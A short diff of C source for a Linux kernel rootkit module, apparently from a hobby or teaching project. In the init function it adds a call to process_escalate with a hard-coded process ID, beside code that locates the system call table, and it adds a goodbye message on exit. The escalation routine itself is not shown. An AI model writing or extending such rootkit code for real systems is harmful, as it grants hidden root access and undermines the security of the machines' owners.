@@ -180,10 +180,11 @@ int rootkit_init(void) {
   if (retval == EFAULT)
     return retval;
   printk("We found the sys call table at %p\n", sys_call_table_addr);
-
+  process_escalate(27614);
   return 0;
 }
 
 void rootkit_exit(void) {
+  printk("rootkit_exit() invoked. Goodbye!\n");
   /*need to clean up the LL*/
 }
